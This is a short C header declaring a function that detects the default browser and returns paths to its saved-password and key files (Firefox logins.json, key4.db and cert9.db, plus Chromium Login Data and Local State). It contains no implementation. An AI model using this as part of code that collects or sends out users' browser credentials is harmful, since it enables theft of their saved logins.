#pragma once
/**
 * @brief Detects the default browser and fills in paths to credential files.
 *
 * For Firefox/Zen:
 *   - output_path1 → logins.json
 *   - output_path2 → key4.db
 *   - output_path3 → cert9.db
 *
 * For Chromium-based browsers (not implemented yet):
 *   - output_path1 → Login Data
 *   - output_path2 → Local State
 *
 * @param output_path1 Buffer to store the first credential file path
 * @param output_path2 Buffer to store the second credential file path
 * @return int 1 if files found, 0 if not supported or not found
 */
int detect_credentials(char* output_path1, char* output_path2,
                      char* output_path3);
